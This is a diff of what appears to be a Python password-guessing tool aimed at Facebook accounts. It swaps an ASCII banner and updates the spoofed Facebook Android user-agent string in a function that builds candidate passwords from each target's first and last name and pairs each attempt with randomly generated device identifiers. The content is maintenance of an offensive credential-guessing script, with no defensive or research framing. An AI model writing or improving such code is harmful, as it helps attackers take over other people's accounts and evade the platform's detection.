@@ -284,17 +284,18 @@ TrialExist=""
 logo=(f"""\033[1;37m
 
 {green}     
-{green}   $$$$$$\                                      $$\ 
-$$  __$$\                                     $$ |
-$$ /  \__| $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$$ |
-\$$$$$$\  $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$ |
- \____$$\ $$ /  $$ |$$$$$$$$ |$$$$$$$$ |$$ /  $$ |
-$$\   $$ |$$ |  $$ |$$   ____|$$   ____|$$ |  $$ |
-\$$$$$$  |$$$$$$$  |\$$$$$$$\ \$$$$$$$\ \$$$$$$$ |
- \______/ $$  ____/  \_______| \_______| \_______|
-          $$ |                                              $$ |                                    
-          \__|                                                                                                                                                               
-            
+{green}    $$$$$$\        $$\   $$\ 
+$$  __$$\       $$ |  $$ |
+$$ /  $$ |      $$ |  $$ |
+$$$$$$$$ |      $$$$$$$$ |
+$$  __$$ |      $$  __$$ |
+$$ |  $$ |      $$ |  $$ |
+$$ |  $$ |      $$ |  $$ |
+\__|  \__|      \__|  \__|
+                          
+                          
+    
+                                                                                                                                                                                           
 {green}   
   {green}     
 {green}  
@@ -645,7 +646,7 @@ def M_file_3(ids,names,passlist):
                         for pw in passlist:
                                 pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                 
-                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 14.5.1; B08FB1X4L6 Build/PD2A.240115.047) [FBAN/FB4A;FBAV/383.0.0.23.106;FBBV/316614371;FBDM/{density=1.0,width=954,height=1797};FBLC/de_DE;FBRV/316997418;FB_FW/2;FBCR/Vodafone CallYa Digital;FBMF/Amazon;FBBD/amazon;FBPN/com.facebook.katana;FBDV/B08FB1X4L6;FBSV/14.5.1;FBOP/1;FBCA/arm64-v8a:armeabi;]"  
+                                ua = "[Dalvik/2.1.0 (Linux; U; Android 10; ASUS_Z010 Build/PLGSU5YD) [FBAN/FB4A;FBAV/428.0.0.32.94;FBBV/42143100;FBCR/Boost Mobile;FBMF/ASUS;FBBD/ASUS;FBPN/com.facebook.katana;FBDV/ASUS_Z010;FBSV/10;FBCA/arm64-v8a;FBDM/{density=3.0,width=720,height=1280}]"
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 li = ['28']
